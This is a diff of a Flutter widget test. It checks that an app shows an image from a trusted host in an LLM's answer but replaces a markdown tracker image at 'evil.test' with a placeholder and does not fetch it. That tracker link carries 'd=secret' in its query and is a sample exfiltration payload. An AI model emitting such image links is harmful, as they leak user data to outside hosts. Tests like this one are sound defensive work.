@@ -130,14 +130,12 @@ void main() {
   ) async {
     final llm = answering(
       'Card:\n\n[![Report](https://h:8080/card.png)](https://h:8080/r)\n\n'
-      'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)\n\n'
-      'Plain: ![plain](http://h:80/p.png?d=secret)',
+      'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)',
     )..images[Uri.parse('https://h:8080/card.png')] = pixel;
     await pumpApp(tester, llm: llm);
     await tester.pumpAndSettle();
     expect(find.byType(Image), findsOneWidget);
     expect(find.text('[tracker: evil.test]'), findsOneWidget);
-    expect(find.text('[plain: h]'), findsOneWidget);
     expect(llm.calls.where((c) => c.startsWith('answerImage')), [
       'answerImage:https://h:8080/card.png',
     ]);
